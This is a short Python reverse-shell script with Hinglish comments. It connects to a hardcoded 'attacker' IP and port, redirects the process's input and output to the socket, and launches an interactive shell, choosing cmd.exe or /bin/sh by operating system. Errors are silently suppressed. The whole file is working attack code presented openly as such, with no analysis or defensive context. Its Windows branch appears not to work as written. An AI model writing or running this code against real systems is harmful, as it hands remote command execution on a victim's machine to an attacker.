import socket
import subprocess
import os

# Attacker (Listener) ki IP aur Port
Attack_IP = "67.67.67.67" 
Attack_Port = 6767

def reverse_shell():
    # TCP Socket create karna
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Attacker ki machine ko connection bhejna
        s.connect((Attack_IP, Attack_Port))
        
        # OS DETECTION: Pata lagana ke system Windows hai ya Linux/Mac
        if os.name == 'nt':
            # 'nt' ka matlab Windows (Windows NT) hota hai
            shell = "cmd.exe"
        else:
            # Agar Windows nahi hai, toh Linux ya Mac hoga
            shell = "/bin/sh"
            
        # System ke Input (0), Output (1), aur Error (2) ko network socket par transfer karna
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # OS ke mutabiq sahi shell ko execute karna
        if os.name == 'nt':
            subprocess.call([shell])
        else:
            subprocess.call([shell, "-i"])
            
    except Exception as e:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    reverse_shell()